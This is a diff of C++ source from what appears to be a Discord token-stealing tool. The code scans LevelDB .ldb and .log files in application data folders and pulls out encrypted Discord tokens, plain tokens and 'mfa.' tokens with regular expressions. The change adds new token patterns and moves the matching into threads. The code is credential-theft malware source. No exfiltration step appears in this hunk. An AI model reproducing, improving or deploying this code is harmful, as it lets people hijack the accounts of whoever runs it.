@@ -54,31 +54,54 @@ public:
         int index = 0;
         for (const std::pair<std::string, std::string> &_pair : path_list) {
 
-            std::vector<std::string> encrypted_token_list;
+             std::vector<std::string> encrypted_token_list;
+
+            std::vector<std::regex> regex_list;
+            regex_list.emplace_back(R"(dQw4w9WgXcQ:[^\"\[\]\(\)]*)");
+            regex_list.emplace_back(R"(dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*)");
+            regex_list.emplace_back("dQw4w9WgXcQ:(.*?)=");
+
+            regex_list.emplace_back(R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})");
+            regex_list.emplace_back(R"(mfa\.[\w-]{84})");
+
+            std::vector<std::thread> thread_list;
+            std::mutex mtx;
+
+            std::vector<std::string> contents;
 
             for (const std::filesystem::directory_entry &entry : std::filesystem::directory_iterator(_pair.second)) {
                 if (entry.is_regular_file()) {
-                    if (fileio::has_extension(entry.path(), ".ldb") || fileio::has_extension(entry.path(), ".log")) {
+                    if (fileIO::has_extension(entry.path(), ".ldb") || fileIO::has_extension(entry.path(), ".log")) {
 
                         std::string content;
-                        fileio::read_utf8_file(entry.path().string(), content);
+                        fileIO::read_utf8_file(entry.path().string(), content);
 
-                        std::vector<std::regex> regex_list;
-                        regex_list.push_back(std::regex(R"(dQw4w9WgXcQ:[^\"\[\]\(\)]*)"));
-                        regex_list.push_back(std::regex(R"(dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*)"));
-                        regex_list.push_back(std::regex("dQw4w9WgXcQ:(.*?)="));
-
-                        for (std::regex r : regex_list) {
-
-                            std::sregex_iterator begin(content.begin(), content.end(), r);
-                            std::sregex_iterator end;
-
-                            for (std::sregex_iterator it = begin; it != end; ++it) {
-                                std::smatch match = *it;
-                                encrypted_token_list.push_back(match.str());
-                            }
-                        }
+                        contents.push_back(content);
                     }
+                }
+            }
+
+            for (std::string &content : contents) {
+                std::thread _thread([&]() {
+                    for (std::regex r : regex_list) {
+
+                        std::sregex_iterator begin(content.begin(), content.end(), r);
+                        std::sregex_iterator end;
+
+                        std::vector<std::string> local_list;
+
+                        for (std::sregex_iterator it = begin; it != end; ++it) {
+                            std::smatch match = *it;
+                            local_list.push_back(match.str());
+                        }
+
+                        std::lock_guard<std::mutex> lock(mtx);
+                        encrypted_token_list.insert(encrypted_token_list.end(), local_list.begin(), local_list.end());
+                    }
+                });
+
+                if (_thread.joinable()) {
+                    _thread.join();
                 }
             }
 
